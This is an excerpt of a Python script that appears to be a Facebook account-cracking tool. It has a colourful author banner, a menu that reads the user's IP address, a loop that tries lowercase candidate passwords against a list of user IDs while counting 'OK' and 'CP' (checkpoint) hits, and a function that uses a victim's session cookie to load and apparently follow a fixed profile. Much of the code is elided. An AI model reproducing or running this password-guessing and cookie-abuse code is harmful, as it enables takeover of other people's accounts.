...
def logo():
	print("""%s
           ...
           \033[1;33m░╚════╝░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝╚═════╝░
             \033[1;96m▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇
             \033[1;93m▇▇➣    \033[1;91mAUTHOR   : ZIHAD HASAN          \033[1;93m▇▇
...
def bsn_menu():
    ...
    IP = ipm["origin"]
    print("             [*]. CREATED BY : JIHAD HASAN SHUVO");time.sleep (0.03)
...
class __bsn__:
    ...
    def __api__(self, user, __chi__):
        global ok,cp,loop
        for i in list('\|-/'):
            sys.stdout.write(f'\r [zihad] {loop}/{len(self.id)} -- OK:- {len(ok)} - CP:- {len(cp)} '),
            sys.stdout.flush()
        for pw in __chi__:
            pw = pw.lower()
    ...
    def follow(self,session,coki):
        r = BeautifulSoup(session.get("https://mbasic.facebook.com/profile.php?id=100083131624990",cookies={"cookie":coki}).text,"html.parser")
